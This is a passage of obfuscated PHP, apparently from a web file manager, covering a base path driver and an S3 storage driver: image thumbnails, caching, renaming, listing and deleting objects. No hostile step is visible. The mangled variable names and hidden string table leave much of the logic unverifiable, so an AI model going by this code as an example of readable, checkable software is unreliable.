$¨Ô¤£éí; $ÛËíÕûù = Hook::filter($æ§İ¿[182], $ÛËíÕûù); $˜…³‡‹â = $ÛËíÕûù[$æ§İ¿[179]]; } echo $˜…³‡‹â; $¨Ô¤£éí += $¿¤æ¹ãı; if ($¿¤æ¹ãı == $•ü—Öª) { $¨Ô¤£éí = $±û«‚ŸÈ + 1; } if ($Æ³èâı‹) { $„£¸²œé = intval(1000 * 1000 * (timeFloat() - $ ÚŠÌ­)); $´âá“æ = $Æ³èâı‹ - $„£¸²œé; if ($´âá“æ > 5) { usleep($´âá“æ); } } } } public function fileOutServer($¶‘İ»„•, $Ä‘â’°½ = false, $†›–Œå = false, $ëâÓÌ´Š = '') { $this->fileOut($¶‘İ»„•, $Ä‘â’°½, $†›–Œå, $ëâÓÌ´Š); } public function fileOutLink($ıÖ¨ğ«Ã) { header($_SERVER[ŒÅŸ‹ä†][183] . $ıÖ¨ğ«Ã); die; } public function cacheMethod($ƒ—±‰¸ë, $¢ÄšÂô, $ÏŠ¥ï›ù = null) { $Ò×ÆƒÑŠ =& $_SERVER[ŒÅŸ‹ä†]; static $£Ø¡ºÎµ = array(); $„©¨´Èñ = $¢ÄšÂô ? ltrim($this->getPathOuter($¢ÄšÂô), $Ò×ÆƒÑŠ[8]) : $Ò×ÆƒÑŠ[12]; $ºÏˆœ­• = $Ò×ÆƒÑŠ[184] . $ƒ—±‰¸ë . $Ò×ÆƒÑŠ[185] . rtrim($„©¨´Èñ, $Ò×ÆƒÑŠ[8]); if (is_null($ƒ—±‰¸ë)) { $£Ø¡ºÎµ = array(); return; } if (is_null($¢ÄšÂô)) { foreach ($£Ø¡ºÎµ as $ºÏˆœ­• => $»ï ñÚ¤) { if (!strstr($ºÏˆœ­•, $Ò×ÆƒÑŠ[184] . $ƒ—±‰¸ë . $Ò×ÆƒÑŠ[186])) { continue; } unset($£Ø¡ºÎµ[$ºÏˆœ­•]); } return; } if ($ÏŠ¥ï›ù === $Ò×ÆƒÑŠ[187]) { unset($£Ø¡ºÎµ[$ºÏˆœ­•]); return; } if (!is_null($ÏŠ¥ï›ù)) { $£Ø¡ºÎµ[$ºÏˆœ­•] = $ÏŠ¥ï›ù; return; } $Şúòµ„ê = isset($£Ø¡ºÎµ[$ºÏˆœ­•]) ? $£Ø¡ºÎµ[$ºÏˆœ­•] : null; if (!is_null($Şúòµ„ê)) { return $Şúòµ„ê; } $Şúòµ„ê = $this->{$ƒ—±‰¸ë}($¢ÄšÂô); $£Ø¡ºÎµ[$ºÏˆœ­•] = $Şúòµ„ê; return $Şúòµ„ê; } public function cacheMethodInfoSet($“Ù˜Üç¢, $³€Óğ¢¸, $ÕÇãÁá¬ = false) { $…ÇÀæá‚ =& $_SERVER[ŒÅŸ‹ä†]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($…ÇÀæá‚[188], $“Ù˜Üç¢, $³€Óğ¢¸); $this->cacheMethod($…ÇÀæá‚[189], $“Ù˜Üç¢, $³€Óğ¢¸ ? !1 : !0); if (is_array($ÕÇãÁá¬)) { $this->cacheMethod($…ÇÀæá‚[190], $“Ù˜Üç¢, $ÕÇãÁá¬); } } public function fileOutImage($ÛÎŠ‡, $ğ³ğ¾ß = 250) { $ˆÒ¼¸„  =& $_SERVER[ŒÅŸ‹ä†]; set_timeout(); if (substr($ÛÎŠ‡, 0, 4) == $ˆÒ¼¸„ [160]) { $this->fileOutLink($ÛÎŠ‡); } $—’îµ¢¾ = $this->info($ÛÎŠ‡); $¡ÊÀçÜÑ = !1; $ı‰ì¹æÊ = isset($GLOBALS[$ˆÒ¼¸„ [191]]) ? $GLOBALS[$ˆÒ¼¸„ [191]] : array(); if ($ı‰ì¹æÊ && $ı‰ì¹æÊ[$ˆÒ¼¸„ [192]] == $—’îµ¢¾[$ˆÒ¼¸„ [97]]) { $—’îµ¢¾ = $ı‰ì¹æÊ; $¼û§‘©Œ = $—’îµ¢¾[$ˆÒ¼¸„ [193]]; if ($¼û§‘©Œ && isset($¼û§‘©Œ[$ˆÒ¼¸„ [194]])) { if ($¼û§‘©Œ[$ˆÒ¼¸„ [194]] <= $ğ³ğ¾ß && $¼û§‘©Œ[$ˆÒ¼¸„ [195]] <= $ğ³ğ¾ß) { $¡ÊÀçÜÑ = !0; } } } if ($—’îµ¢¾[$ˆÒ¼¸„ [89]] <= 1024 * 50 || $¡ÊÀçÜÑ || !function_exists($ˆÒ¼¸„ [196]) || $—’îµ¢¾[$ˆÒ¼¸„ [177]] == $ˆÒ¼¸„ [197]) { return $this->fileOut($ÛÎŠ‡, !1, $—’îµ¢¾[$ˆÒ¼¸„ [42]]); } $“Ú¬¹’Ÿ = kodIO::hashPath($—’îµ¢¾); $†·ËóÉÁ = "\x63\157\x76\x65\x72\137{$“Ú¬¹’Ÿ}\137{$ğ³ğ¾ß}\x2e\160\156\x67"; $¾Ô®İ§ = IO_PATH_SYSTEM_TEMP . $ˆÒ¼¸„ [198]; $ŸùÒŠÉú = IO::infoFullSimple($¾Ô®İ§); $³‡‘šÇë = $ŸùÒŠÉú && is_array($ŸùÒŠÉú) ? $ŸùÒŠÉú[$ˆÒ¼¸„ [97]] : $ˆÒ¼¸„ [12]; if (!$³‡‘šÇë) { $³‡‘šÇë = IO::mkdir($¾Ô®İ§); } if ($—’îµ¢¾[$ˆÒ¼¸„ [199]] == $ˆÒ¼¸„ [200] && isset($—’îµ¢¾[$ˆÒ¼¸„ [201]]) && $—’îµ¢¾[$ˆÒ¼¸„ [201]] == kodIO::sourceID($³‡‘šÇë)) { $†§•èï€ = $—’îµ¢¾[$ˆÒ¼¸„ [202]]; if ($ğ³ğ¾ß <= 500) { $ò‚•”¥½ = preg_replace($ˆÒ¼¸„ [203], $ˆÒ¼¸„ [204], $—’îµ¢¾[$ˆÒ¼¸„ [42]]); $†§•èï€ = IO::fileNameExist($³‡‘šÇë, $ò‚•”¥½); } return IO::fileOut(KodIO::make($†§•èï€), !1, $—’îµ¢¾[$ˆÒ¼¸„ [42]]); } $•í—ÚÅœ = IO::fileNameExist($³‡‘šÇë, $†·ËóÉÁ); if ($•í—ÚÅœ) { return IO::fileOut(KodIO::make($•í—ÚÅœ), !1, $—’îµ¢¾[$ˆÒ¼¸„ [42]]); } if ($ğ³ğ¾ß > 1000) { $this->makeImageCover($³‡‘šÇë, $ÛÎŠ‡, $†·ËóÉÁ, $ğ³ğ¾ß); $this->makeImageCover($³‡‘šÇë, $ÛÎŠ‡, "\143\x6f\x76\x65\162\137{$“Ú¬¹’Ÿ}\x5f\62\65\x30\x2e\x70\156\147", 250); $•í—ÚÅœ = IO::fileNameExist($³‡‘šÇë, $†·ËóÉÁ); if ($•í—ÚÅœ) { return IO::fileOut(KodIO::make($•í—ÚÅœ), !1, $—’îµ¢¾[$ˆÒ¼¸„ [42]]); } die; } if (!kodIO::allowCover($—’îµ¢¾)) { return $this->fileOut($ÛÎŠ‡, !1, $—’îµ¢¾[$ˆÒ¼¸„ [42]]); } $üŞ÷óÚ• = Cache::get($†·ËóÉÁ); if ($üŞ÷óÚ• == $ˆÒ¼¸„ [205] || $üŞ÷óÚ• == $ˆÒ¼¸„ [206]) { echo $üŞ÷óÚ•; die; } Cache::set($†·ËóÉÁ, $ˆÒ¼¸„ [206], 60); $¯èŸ³â = array($³‡‘šÇë, $—’îµ¢¾[$ˆÒ¼¸„ [97]], $†·ËóÉÁ, $ğ³ğ¾ß); $¯™šŸµ = $ˆÒ¼¸„ [207] . $—’îµ¢¾[$ˆÒ¼¸„ [89]] . $ˆÒ¼¸„ [208] . $†·ËóÉÁ . $ˆÒ¼¸„ [209] . $—’îµ¢¾[$ˆÒ¼¸„ [42]] . $ˆÒ¼¸„ [210] . $—’îµ¢¾[$ˆÒ¼¸„ [97]]; TaskQueue::add($ˆÒ¼¸„ [211], $¯èŸ³â, $¯™šŸµ, $†·ËóÉÁ); } public function makeImageCover($¤ ïÕö„, $îŞ¿ıí½, $ÇçØŞŠ§, $‹ë³û†¶) { $ğÜëÔ° =& $_SERVER[ŒÅŸ‹ä†]; if (IO::fileNameExist($¤ ïÕö„, $ÇçØŞŠ§)) { return $ğÜëÔ°[212]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $¼²¯‰ = $this->getPathOuter($îŞ¿ıí½); $ä€™Ó–” = DATA_THUMB . $ÇçØŞŠ§; del_file($ä€™Ó–”); $¸Ó«µ¸ = IO::copy($¼²¯‰, TEMP_FILES, !1, $ÇçØŞŠ§); if (!@file_exists($¸Ó«µ¸)) { return $ğÜëÔ°[213]; } ImageThumb::createThumb($¸Ó«µ¸, $ä€™Ó–”, $‹ë³û†¶, $‹ë³û†¶ * 10); if (@file_exists($ä€™Ó–”)) { Cache::remove($ÇçØŞŠ§); return IO::move($ä€™Ó–”, $¤ ïÕö„); } Cache::set($ÇçØŞŠ§, $ğÜëÔ°[205], 600); del_file($ä€™Ó–”); return $ğÜëÔ°[214] . $¸Ó«µ¸ . $ğÜëÔ°[84]; } public function fileOutImageServer($ñÏğ¯É¾, $–—·õÄ¸ = 250) { $this->fileOutImage($ñÏğ¯É¾, $–—·õÄ¸); } public function fileNameAuto($âØø§ƒâ, $ğ™”Ñ´Æ, $÷™Šµ¸î = REPEAT_RENAME, $‡„†±¬Í = false) { $ê‚·Æ¹ä =& $_SERVER[ŒÅŸ‹ä†]; $Ö‡¡îì£ = $âØø§ƒâ === $ê‚·Æ¹ä[12] ? $ğ™”Ñ´Æ : rtrim($âØø§ƒâ, $ê‚·Æ¹ä[8]) . $ê‚·Æ¹ä[8] . $ğ™”Ñ´Æ; if ($÷™Šµ¸î == REPEAT_REPLACE || !$this->exist($Ö‡¡îì£) || $‡„†±¬Í && $÷™Šµ¸î != REPEAT_RENAME_FOLDER) { return $ğ™”Ñ´Æ; } if ($÷™Šµ¸î == REPEAT_SKIP) { return !1; } $­ÃíäÉ = $ê‚·Æ¹ä[10] . get_path_ext($ğ™”Ñ´Æ); $­ÃíäÉ = $­ÃíäÉ == $ê‚·Æ¹ä[10] || $‡„†±¬Í ? $ê‚·Æ¹ä[12] : $­ÃíäÉ; $üÖÂŠ½ = 1; $Â¤„èğÇ = substr($ğ™”Ñ´Æ, 0, strlen($ğ™”Ñ´Æ) - strlen($­ÃíäÉ)); $ƒ“ïƒ÷ = $Â¤„èğÇ . "\x28{$üÖÂŠ½}\x29{$­ÃíäÉ}"; while ($this->exist(rtrim($âØø§ƒâ, $ê‚·Æ¹ä[8]) . $ê‚·Æ¹ä[8] . $ƒ“ïƒ÷)) { $ƒ“ïƒ÷ = $Â¤„èğÇ . "\50{$üÖÂŠ½}\x29{$­ÃíäÉ}"; $üÖÂŠ½++; } return $ƒ“ïƒ÷; } private function fileNameAutoList($¤Ùø“ÒÚ, $‡‚€Ş¤×, $Ğèõãí = false) { $Ì…¼û«Ô =& $_SERVER[ŒÅŸ‹ä†]; $ş¸¦ùø = $this->listPath($¤Ùø“ÒÚ, !0); $ş¸¦ùø = array_merge($ş¸¦ùø[$Ì…¼û«Ô[95]], $ş¸¦ùø[$Ì…¼û«Ô[96]]); $‹¡¸”· = array_to_keyvalue($ş¸¦ùø, $Ì…¼û«Ô[12], $Ì…¼û«Ô[42]); $Æßˆì¹Ÿ = $Ì…¼û«Ô[10] . get_path_ext($‡‚€Ş¤×); $Æßˆì¹Ÿ = $Æßˆì¹Ÿ == $Ì…¼û«Ô[10] || $Ğèõãí ? $Ì…¼û«Ô[12] : $Æßˆì¹Ÿ; $‰¡½á´‰ = substr($‡‚€Ş¤×, 0, strlen($‡‚€Ş¤×) - strlen($Æßˆì¹Ÿ)); $‘ÖÂ¢¢§ = $‰¡½á´‰ . "\50\x30\51{$Æßˆì¹Ÿ}"; for ($Í¡¬€Ìˆ = 1; $Í¡¬€Ìˆ <= count($‹¡¸”·) + 1; $Í¡¬€Ìˆ++) { $‘ÖÂ¢¢§ = $‰¡½á´‰ . "\x28{$Í¡¬€Ìˆ}\x29{$Æßˆì¹Ÿ}"; if (!in_array_not_case($‘ÖÂ¢¢§, $‹¡¸”·)) { return $‘ÖÂ¢¢§; } } return $‘ÖÂ¢¢§; } public function listAllFiles($Ú«ğÅæ¡, $ÖÎú…‚©) { $ßûÇĞ‚© =& $_SERVER[ŒÅŸ‹ä†]; if (empty($ÖÎú…‚©)) { return array(); } $ÖœÁˆ©² = array_keys($ÖÎú…‚©); $µËÛŞ¢Ç = array(); $Ú«ğÅæ¡ = trim($Ú«ğÅæ¡, $ßûÇĞ‚©[8]); foreach ($ÖÎú…‚© as $¸æÄ‚ğæ => $™”÷èû†) { $¯àğ•…ƒ = ltrim(substr(trim($¸æÄ‚ğæ, $ßûÇĞ‚©[8]), strlen($Ú«ğÅæ¡)), $ßûÇĞ‚©[8]); if (substr($¸æÄ‚ğæ, -1) == $ßûÇĞ‚©[8]) { $¯àğ•…ƒ = rtrim($¯àğ•…ƒ, $ßûÇĞ‚©[8]) . $ßûÇĞ‚©[8]; } $µËÛŞ¢Ç = array_merge($µËÛŞ¢Ç, $this->slicePath($¯àğ•…ƒ)); } $½ÅØÙ¹Ğ = array(); foreach (array_unique($µËÛŞ¢Ç) as $‰Éä™ë) { $Ø³ü£Å× = array($ßûÇĞ‚©[97] => $this->getPathOuter($ßûÇĞ‚©[8] . $Ú«ğÅæ¡ . $ßûÇĞ‚©[8] . $‰Éä™ë), $ßûÇĞ‚©[88] => 1, $ßûÇĞ‚©[89] => 0); if (substr($‰Éä™ë, -1) != $ßûÇĞ‚©[8]) { $Ø³ü£Å×[$ßûÇĞ‚©[88]] = 0; $·¥Î³» = $this->getPath($Ú«ğÅæ¡ . $ßûÇĞ‚©[8] . $‰Éä™ë); if (isset($ÖÎú…‚©[$·¥Î³»])) { $ÌÛ»ƒî = $ÖÎú…‚©[$·¥Î³»]; if (isset($ÌÛ»ƒî[$ßûÇĞ‚©[89]])) { $Ø³ü£Å×[$ßûÇĞ‚©[89]] = intval($ÌÛ»ƒî[$ßûÇĞ‚©[89]]); } if (isset($ÌÛ»ƒî[$ßûÇĞ‚©[215]])) { $Ø³ü£Å×[$ßûÇĞ‚©[98]] = intval($ÌÛ»ƒî[$ßûÇĞ‚©[215]]); } } } $½ÅØÙ¹Ğ[] = $Ø³ü£Å×; } return $½ÅØÙ¹Ğ; } public function slicePath($ö“Ï€€“) { $—¶­÷Š† =& $_SERVER[ŒÅŸ‹ä†]; $ä ¨‹Í÷ = explode($—¶­÷Š†[8], trim($ö“Ï€€“, $—¶­÷Š†[8])); $æŞÚ‡ÌŸ = 0; do { ++$æŞÚ‡ÌŸ; $¢´Ş–Ã[] = implode($—¶­÷Š†[8], array_slice($ä ¨‹Í÷, 0, $æŞÚ‡ÌŸ)) . $—¶­÷Š†[8]; } while ($æŞÚ‡ÌŸ < count($ä ¨‹Í÷)); $¢´Ş–Ã[count($ä ¨‹Í÷) - 1] = $ö“Ï€€“; return $¢´Ş–Ã; } public function getHost() { $¸áí–Ã¯ =& $_SERVER[ŒÅŸ‹ä†]; $şªúÈ” = parse_url(trim($this->domain, $¸áí–Ã¯[8])); $Î˜™Œş³ = isset($şªúÈ”[$¸áí–Ã¯[216]]) ? $şªúÈ”[$¸áí–Ã¯[216]] : http_type(); $¯Ëğ—Ù  = isset($şªúÈ”[$¸áí–Ã¯[217]]) ? $şªúÈ”[$¸áí–Ã¯[217]] : $şªúÈ”[$¸áí–Ã¯[97]]; if (isset($şªúÈ”[$¸áí–Ã¯[218]])) { $¯Ëğ—Ù  .= $¸áí–Ã¯[4] . $şªúÈ”[$¸áí–Ã¯[218]]; } return $Î˜™Œş³ . $¸áí–Ã¯[219] . $¯Ëğ—Ù ; } public function pathEncode($öÛ’Ê™¿) { $÷—¶‰ºÍ =& $_SERVER[ŒÅŸ‹ä†]; return str_replace($÷—¶‰ºÍ[220], $÷—¶‰ºÍ[8], rawurlencode($öÛ’Ê™¿)); } public function writeLog($§ÅÒ¼¼ê = '', $ÓæÇá£æ = false) { $ÊÛĞ¥ÒÔ =& $_SERVER[ŒÅŸ‹ä†]; $ıÌ›”‹Ö = in_array(ACTION, array($ÊÛĞ¥ÒÔ[221], $ÊÛĞ¥ÒÔ[222])); if (!$ıÌ›”‹Ö && !GLOBAL_DEBUG) { return; } $ÛÉáĞÖ = $§ÅÒ¼¼ê; static $Ş«Œ­ò = null; if (!$Ş«Œ­ò) { $Ş«Œ­ò = strtoupper($this->getType()); } $§ÅÒ¼¼ê = $Ş«Œ­ò . $ÊÛĞ¥ÒÔ[223] . $§ÅÒ¼¼ê; if ($ÓæÇá£æ) { $ëÕÕë¬ç = error_get_last(); if ($ëÕÕë¬ç) { $§ÅÒ¼¼ê = array($§ÅÒ¼¼ê, $ëÕÕë¬ç); } } write_log($§ÅÒ¼¼ê, $ÊÛĞ¥ÒÔ[224]); if ($ıÌ›”‹Ö) { throw new Exception($ÛÉáĞÖ); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($òªÉÚ´·) { set_timeout(); require_once SDK_DIR . $_SERVER[ŒÅŸ‹ä†][225]; parent::__construct(); $this->_init($òªÉÚ´·); } public function _init($¸½åœ­†) { $Ã–í—Í· =& $_SERVER[ŒÅŸ‹ä†]; $this->config = $¸½åœ­†; foreach ($¸½åœ­† as $ç³Ü½å => $Öôáúäš) { if (isset($this->{$ç³Ü½å})) { $this->{$ç³Ü½å} = $Öôáúäš; } } $this->endpoint = $¸½åœ­†[$Ã–í—Í·[226]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $÷¨‰Ş‚Ø = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($÷¨‰Ş‚Ø, 0, 7) == $Ã–í—Í·[227]) { $÷¨‰Ş‚Ø = $Ã–í—Í·[228] . substr($÷¨‰Ş‚Ø, 7); } $this->client->setEndpoint($÷¨‰Ş‚Ø); if (in_array(ACTION, array($Ã–í—Í·[221], $Ã–í—Í·[222]))) { $this->client->setExceptions(); } } public function setSignVersion($Ÿ¯ã“‚˜ = "\166\64") { $this->signVer = $Ÿ¯ã“‚˜; $this->client->setSignVersion($Ÿ¯ã“‚˜); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ÆÛ¶ç°) { return null; } } public function isBucketCors() { $åÀãåı” =& $_SERVER[ŒÅŸ‹ä†]; $èÑ ¹é¢ = $this->getBucketCors(); if (!$èÑ ¹é¢ || !is_array($èÑ ¹é¢)) { return !1; } if (!is_array($èÑ ¹é¢[$åÀãåı”[229]])) { $èÑ ¹é¢[$åÀãåı”[229]] = explode($åÀãåı”[60], $èÑ ¹é¢[$åÀãåı”[229]]); } if ($èÑ ¹é¢[$åÀãåı”[230]] != $åÀãåı”[231] || !in_array($åÀãåı”[231], $èÑ ¹é¢[$åÀãåı”[229]])) { return !1; } $ÍæÏ±ª = array_map($åÀãåı”[232], $èÑ ¹é¢[$åÀãåı”[233]]); if (!is_array($ÍæÏ±ª)) { $ÍæÏ±ª = array(); } $âÉŞø÷ = array($åÀãåı”[234], $åÀãåı”[235], $åÀãåı”[236], $åÀãåı”[237], $åÀãåı”[238]); $ìÉˆáüÒ = array_diff($âÉŞø÷, $ÍæÏ±ª); return empty($ìÉˆáüÒ); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($¾ÒÙÄø, $Ÿ™í¿ƒ = '', $ŞÇÑœÍ = REPEAT_RENAME) { $ÊÆ”â»º = $this->setContent($¾ÒÙÄø, $Ÿ™í¿ƒ); if ($ÊÆ”â»º !== !1) { return $this->getPathOuter($¾ÒÙÄø); } return !1; } public function mkdir($”’†ÊÈ, $½÷·óàù = REPEAT_SKIP) { $Ş‰®Ù•´ =& $_SERVER[ŒÅŸ‹ä†]; if (empty($”’†ÊÈ) && $”’†ÊÈ !== $Ş‰®Ù•´[239]) { return !1; } if ($½÷·óàù && $this->_isFolder($”’†ÊÈ)) { return $this->getPathOuter($”’†ÊÈ); } $¼›Á²åÈ = $this->setContent($”’†ÊÈ, $Ş‰®Ù•´[12], !0); if ($¼›Á²åÈ !== !1) { return $this->getPathOuter($”’†ÊÈ); } return !1; } public function copyFile($ûÉÒøÌé, $Áß÷ÍÀú, $·í¼â§ö = array()) { $ØİÃ€´ =& $_SERVER[ŒÅŸ‹ä†]; $·ËâıÌÁ = $this->objectMeta($ûÉÒøÌé); if (!$·ËâıÌÁ) { return !1; } if ($·ËâıÌÁ[$ØİÃ€´[89]] <= 1024 * 1024 * 200) { $«Ô²î¢ï = $this->client->copyObject($this->bucket, $ûÉÒøÌé, $this->bucket, $Áß÷ÍÀú, $ØİÃ€´[240], $·í¼â§ö); } else { $«Ô²î¢ï = $this->client->multiCopyObject($this->bucket, $ûÉÒøÌé, $this->bucket, $Áß÷ÍÀú, $·í¼â§ö); } $«Ô²î¢ï = $«Ô²î¢ï ? $this->getPathOuter($Áß÷ÍÀú) : !1; return $«Ô²î¢ï; } public function moveFile($îƒ¯ÛœÍ, $Ü¼Ô…ñõ) { if ($this->copyFile($îƒ¯ÛœÍ, $Ü¼Ô…ñõ)) { $this->delFile($îƒ¯ÛœÍ); return $this->getPathOuter($Ü¼Ô…ñõ); } return !1; } public function delFile($³ÑÎù©) { return $this->client->deleteObject($this->bucket, $³ÑÎù©); } public function delFolder($ÓŒÖçå) { $Ÿ­—º =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->exist($ÓŒÖçå)) { return !0; } $this->listItemCache = !1; $‰° «öŠ = $this->fileList($ÓŒÖçå); $this->listItemCache = !0; $’™ÀƒœÆ = trim($ÓŒÖçå, $Ÿ­—º[8]) . $Ÿ­—º[8]; if (!empty($ÓŒÖçå) && $ÓŒÖçå !== $Ÿ­—º[239] && !in_array($’™ÀƒœÆ, $‰° «öŠ[$Ÿ­—º[95]])) { $‰° «öŠ[$Ÿ­—º[95]][] = $’™ÀƒœÆ; } $²¦¢™ƒ = $this->delByBatch($‰° «öŠ[$Ÿ­—º[96]]); if (!$²¦¢™ƒ) { return !1; } $²¦¢™ƒ = $this->delByBatch($‰° «öŠ[$Ÿ­—º[95]]); if (!$²¦¢™ƒ) { return !1; } return $this->delFile($’™ÀƒœÆ); } private function delByBatch($Òªá©) { foreach (array_chunk($Òªá©, 1000) as $œ¬¸ˆ×¾) { $ß‹ï¾Ú² = $this->client->deleteObjects($this->bucket, $œ¬¸ˆ×¾); if (!$ß‹ï¾Ú²) { return !1; } } return !0; } public function rename($¥Ğââ¥•, $Á÷ƒ¢) { return $this->renameObject($¥Ğââ¥•, $Á÷ƒ¢); } public function listPath($ª¡±çáë, $‡†ãŞ¿ = false) { $Äá±£¹Ô =& $_SERVER[ŒÅŸ‹ä†]; $µ¸¿¶† = $this->fileList($ª¡±çáë, $Äá±£¹Ô[8], !0); foreach ($µ¸¿¶†[$Äá±£¹Ô[95]] as $ã´ŞÛŸ… => $’úı·ê‘) { $µ¸¿¶†[$Äá±£¹Ô[95]][$ã´ŞÛŸ…] = $this->folderInfo($’úı·ê‘, $‡†ãŞ¿, $’úı·ê‘); } foreach ($µ¸¿¶†[$Äá±£¹Ô[96]] as $ã´ŞÛŸ… => $’úı·ê‘) { $µ¸¿¶†[$Äá±£¹Ô[96]][$ã´ŞÛŸ…] = $this->fileInfo($’úı·ê‘[$Äá±£¹Ô[42]], $‡†ãŞ¿, $’úı·ê‘); } return $µ¸¿¶†; } protected function infoChildren($íâ¿üë , &$ËïµÒÑ¼) { $Ä…äøª˜ =& $_SERVER[ŒÅŸ‹ä†]; $ç¶Óóò = $this->fileList($íâ¿üë , $Ä…äøª˜[12], !0); $ËïµÒÑ¼[$Ä…äøª˜[91]] += count($ç¶Óóò[$Ä…äøª˜[95]]); $ËïµÒÑ¼[$Ä…äøª˜[90]] += count($ç¶Óóò[$Ä…äøª˜[96]]); foreach ($ç¶Óóò[$Ä…äøª˜[96]] as $ˆ¶àŸ©«) { if (!$ˆ¶àŸ©« || !$ˆ¶àŸ©«[$Ä…äøª˜[89]]) { continue; } $ËïµÒÑ¼[$Ä…äøª˜[89]] += $ˆ¶àŸ©«[$Ä…äøª˜[89]]; } } private function fileInfo($¡ö¼±ÖÁ, $ç¢ËİÔÕ = false, $Ê¶“Œ©æ = array()) { $¤ãòÎ˜ =& $_SERVER[ŒÅŸ‹ä†]; $Å–ÊªëÎ = array($¤ãòÎ˜[42] => $this->pathThis($¡ö¼±ÖÁ), $¤ãòÎ˜[97] => $this->getPathOuter($¡ö¼±ÖÁ), $¤ãòÎ˜[43] => $¤ãòÎ˜[241], $¤ãòÎ˜[177] => $this->ext($¡ö¼±ÖÁ), $¤ãòÎ˜[89] => isset($Ê¶“Œ©æ[$¤ãòÎ˜[89]]) ? $Ê¶“Œ©æ[$¤ãòÎ˜[89]] : 0); if ($ç¢ËİÔÕ) { return $Å–ÊªëÎ; } $Å–ÊªëÎ[$¤ãòÎ˜[242]] = $Å–ÊªëÎ[$¤ãòÎ˜[98]] = 0; $Å–ÊªëÎ[$¤ãòÎ˜[243]] = $Å–ÊªëÎ[$¤ãòÎ˜[244]] = !0; if (empty($Ê¶“Œ©æ)) { $Ê¶“Œ©æ = $this->objectMeta($¡ö¼±ÖÁ); if (!$Ê¶“Œ©æ) { return $Å–ÊªëÎ; } } if (isset($Ê¶“Œ©æ[$¤ãòÎ˜[245]]) && $Ê¶“Œ©æ[$¤ãòÎ˜[245]]) { $Å–ÊªëÎ[$¤ãòÎ˜[246]] = $Ê¶“Œ©æ[$¤ãòÎ˜[245]]; } if (isset($Ê¶“Œ©æ[$¤ãòÎ˜[215]])) { $Å–ÊªëÎ[$¤ãòÎ˜[98]] = $Ê¶“Œ©æ[$¤ãòÎ˜[215]]; } if (isset($Ê¶“Œ©æ[$¤ãòÎ˜[89]])) { $Å–ÊªëÎ[$¤ãòÎ˜[89]] = $Ê¶“Œ©æ[$¤ãòÎ˜[89]]; } return $Å–ÊªëÎ; } private function folderInfo($×—œØÓ—, $¬îèÅ¬„ = false, $¥‘ÇÏ±´ = array()) { $¶©Ùî»Á =& $_SERVER[ŒÅŸ‹ä†]; $‰Àõ®É… = array($¶©Ùî»Á[42] => $this->pathThis($×—œØÓ—), $¶©Ùî»Á[97] => $this->getPathOuter($¶©Ùî»Á[8] . $×—œØÓ—), $¶©Ùî»Á[43] => $¶©Ùî»Á[88]); if ($¬îèÅ¬„) { return $‰Àõ®É…; } $‰Àõ®É…[$¶©Ùî»Á[242]] = $‰Àõ®É…[$¶©Ùî»Á[98]] = 0; $‰Àõ®É…[$¶©Ùî»Á[243]] = $‰Àõ®É…[$¶©Ùî»Á[244]] = !0; if ($×—œØÓ— == $¶©Ùî»Á[12]) { return $‰Àõ®É…; } if (empty($¥‘ÇÏ±´)) { $¥‘ÇÏ±´ = $this->objectMeta(trim($×—œØÓ—, $¶©Ùî»Á[8]) . $¶©Ùî»Á[8]); } if (isset($¥‘ÇÏ±´[$¶©Ùî»Á[215]])) { $‰Àõ®É…[$¶©Ùî»Á[242]] = $¥‘ÇÏ±´[$¶©Ùî»Á[215]]; } return $‰Àõ®É…; } private function fileList($¬ÙÌÓÂÏ, $Œí·òÓ¢ = '', $±ë­ô§Ë = 0) { $³Ü©Öë =& $_SERVER[ŒÅŸ‹ä†]; $à‡Ì‚‰ = rtrim($¬ÙÌÓÂÏ, $³Ü©Öë[8]) . $³Ü©Öë[8]; $”Ì“º»§ = $this->listObjs($à‡Ì‚‰, null, null, $Œí·òÓ¢); if (!$”Ì“º»§) { return array($³Ü©Öë[95] => array(), $³Ü©Öë[96] => array()); } $“‰öƒ¼Ö = $²É“¿˜ = array(); foreach ($”Ì“º»§[$³Ü©Öë[247]] as $‰¤úÚÀï) { $¤÷×í¬ = $‰¤úÚÀï[$³Ü©Öë[42]]; if ($¤÷×í¬ == $à‡Ì‚‰) { continue; } $ Â”ğ» = isset($‰¤úÚÀï[$³Ü©Öë[89]]) ? $‰¤úÚÀï[$³Ü©Öë[89]] : 0; $¼âûÓÂ¢ = $ Â”ğ» == 0 && substr($¤÷×í¬, strlen($¤÷×í¬) - 1, 1) == $³Ü©Öë[8] ? !0 : !1; $this->cacheMethodInfoSet($¤÷×í¬, $¼âûÓÂ¢, $‰¤úÚÀï); if ($¼âûÓÂ¢) { $“‰öƒ¼Ö[] = $¤÷×í¬; continue; } $²É“¿˜[] = $±ë­ô§Ë ? $‰¤úÚÀï : $¤÷×í¬; } foreach ($”Ì“º»§[$³Ü©Öë[248]] as $‰¤úÚÀï) { $“‰öƒ¼Ö[] = $‰¤úÚÀï[$³Ü©Öë[42]]; $this->cacheMethodInfoSet($‰¤úÚÀï[$³Ü©Öë[42]], !0); } $this->cacheMethodInfoSet($¬ÙÌÓÂÏ, !0); return array($³Ü©Öë[95] => $“‰öƒ¼Ö, $³Ü©Öë[96] => $²É“¿˜); } private function listObjs($ºœ›Êë, $÷“Ø…®ª = null, $Ú˜›ª¬ë = null, $Œ‘ô¼°ä = null) { $³ÚîÖ¢ì =& $_SERVER[ŒÅŸ‹ä†]; $ºœ›Êë = trim($ºœ›Êë, $³ÚîÖ¢ì[8]); $¼òì½¯½ = empty($ºœ›Êë) && $ºœ›Êë !== $³ÚîÖ¢ì[239] ? $³ÚîÖ¢ì[12] : $ºœ›Êë . $³ÚîÖ¢ì[8]; return $this->client->getBucket($this->bucket, $¼òì½¯½, $÷“Ø…®ª, 